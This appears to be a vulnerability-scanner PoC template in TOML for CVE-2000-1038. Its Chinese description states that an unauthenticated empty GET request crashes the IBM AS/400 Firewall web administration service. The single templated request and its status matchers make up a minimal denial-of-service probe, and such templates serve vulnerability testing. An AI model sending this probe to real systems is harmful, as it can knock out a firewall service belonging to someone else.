[info]
author = "ave"
description = "向IBM AS/400 Firewall Web管理接口发送空GET请求，触发处理异常导致防火墙服务崩溃。攻击者无需认证即可远程实施，造成拒绝服务。"
id = "POC-AVE-2000-1058"
name = "IBM AS/400 Firewall 空GET请求拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1058"]
vuln_id = [
    "CVE-2000-1038",
    "AVE-2000-1058",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
    502,
    503,
]
type = "status"
